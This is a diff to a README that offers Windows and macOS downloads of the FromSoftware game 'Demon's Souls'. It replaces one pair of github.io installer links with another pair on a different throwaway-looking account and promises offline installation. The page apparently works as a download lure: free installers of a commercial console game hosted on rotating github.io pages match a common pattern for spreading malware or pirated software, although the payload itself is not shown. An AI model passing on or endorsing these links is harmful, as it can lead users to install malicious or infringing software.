@@ -17,7 +17,7 @@ Demon's Souls is the critically acclaimed FromSoftware action RPG that started t
 
 | Platform | Link |
 |----------|------|
-| Windows  | [Download for Windows](https://zenboulderagora.github.io/Windw/) |
-| macOS    | [Download for macOS](https://zenboulderagora.github.io/macdw/) |
+| Windows  | [Download for Windows](https://packgiverchopper3.github.io/winsetup/) |
+| macOS    | [Download for macOS](https://packgiverchopper3.github.io/macsetup/) |
 
 > Install offline — no internet connection required during setup.
